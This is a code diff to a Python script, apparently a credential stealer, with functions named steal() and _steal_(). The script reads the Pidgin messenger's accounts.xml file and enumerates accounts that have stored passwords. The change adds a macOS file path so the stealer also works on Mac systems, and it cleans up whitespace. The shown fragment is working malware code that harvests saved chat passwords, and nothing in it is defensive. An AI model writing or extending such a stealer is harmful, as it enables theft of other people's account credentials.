@@ -10,6 +10,8 @@ def steal():
 	elif platform.system() == "Windows":
 		# Set the path for Windows
 		path = os.getenv("APPDATA") + "\\.purple\\accounts.xml"
+	elif platform.system() == 'Darwin':
+		path = os.path.expanduser('~/.purple/accounts.xml')
 	else:
 		# Mac isn't supported now
 		return("[-] "+platform.system()+" is not supported.")
@@ -24,7 +26,7 @@ def _steal_(path):
 	except:
 		# Uh,oh file not found
 		return ("[-] accounts.xml not found")
-	# Enumerate the accounts where password is present	
+	# Enumerate the accounts where password is present
 	for acc in root:
 		# Check for password presence
 		if acc[2].tag == "password":
